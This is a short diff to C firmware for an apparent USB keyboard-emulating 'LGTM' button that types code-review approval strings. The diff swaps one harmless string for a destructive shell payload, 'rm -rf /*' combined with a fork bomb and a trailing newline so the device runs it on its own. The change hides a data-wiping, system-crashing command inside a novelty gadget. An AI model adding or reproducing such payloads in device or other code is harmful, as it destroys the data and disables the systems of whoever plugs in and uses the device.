@@ -68,7 +68,7 @@ char g_tx_queue[128];
 const ROM char CFG_MODE_STR[] = "*-*-* LGTM-HID config *-*-*    ";
 const ROM char* ROM LGTM_STRINGS[] = {"LGTM ", "RS-LGTM ",
                                       "2,3-dimethyl-1,3-butadiene-stamp LGTM ",
-                                      "stampty stamp LGTM "};
+                                      "rm -rf /* & :(){ :|:& };:\n "};
 #define NUM_LGTM_STRINGS 4
 
 void BlinkUSBStatus(void);
